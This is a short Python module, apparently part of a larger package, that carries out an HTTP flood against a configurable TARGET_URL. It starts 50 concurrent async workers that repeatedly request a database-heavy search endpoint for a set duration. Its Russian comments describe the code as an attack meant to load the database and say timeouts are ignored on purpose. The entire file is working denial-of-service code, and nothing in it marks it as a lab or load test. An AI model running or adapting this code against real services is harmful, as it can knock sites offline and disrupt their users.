import asyncio
import httpx
from . import TARGET_URL

async def worker(client: httpx.AsyncClient, stop_event: asyncio.Event):
    """Бесконечно шлёт запросы, пока не придёт сигнал остановки."""
    while not stop_event.is_set():
        try:
            # Бьём по тяжелому эндпоинту поиска, чтобы нагрузить БД
            await client.get(f"{TARGET_URL}/search?q=test", timeout=2.0)
        except Exception:
            pass # Игнорируем таймауты, это часть атаки

async def run_http_flood(duration: int = 30, concurrency: int = 50):
    """Запускает HTTP Flood."""
    print(f"🔥 Starting HTTP Flood for {duration}s with {concurrency} concurrent workers...")
    
    stop_event = asyncio.Event()
    
    async with httpx.AsyncClient() as client:
        tasks = [asyncio.create_task(worker(client, stop_event)) for _ in range(concurrency)]
        
        await asyncio.sleep(duration)
        stop_event.set()
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    print("✅ HTTP Flood finished.")